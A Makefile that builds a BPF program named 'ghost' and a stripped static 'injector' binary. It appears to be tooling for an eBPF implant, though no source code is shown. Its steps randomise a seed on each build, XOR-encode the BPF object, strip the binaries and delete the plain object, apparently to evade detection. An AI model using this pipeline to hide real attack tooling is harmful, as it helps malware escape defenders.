CC = clang
ZIG = zig
SEED = $(shell head -c 4 /dev/urandom | xxd -p)

all: bpf injector key clean_obj

bpf:
	mkdir -p target
	$(CC) -O3 -target bpf -DSEED=0x$(SEED) -c src/bpf/ghost.c -o target/ghost.o
	python3 -c "d=open('target/ghost.o','rb').read();open('target/ghost.o','wb').write(bytearray([b^0x7A for b in d]))"

injector:
	$(ZIG) build-exe src/main.zig -target x86_64-linux-musl -O ReleaseSmall --strip --name target/zt

key:
	$(CC) -O3 src/key.c -DSEED=0x$(SEED) -o target/key
	strip target/key

clean_obj:
	rm -f target/ghost.o

clean:
	rm -rf target
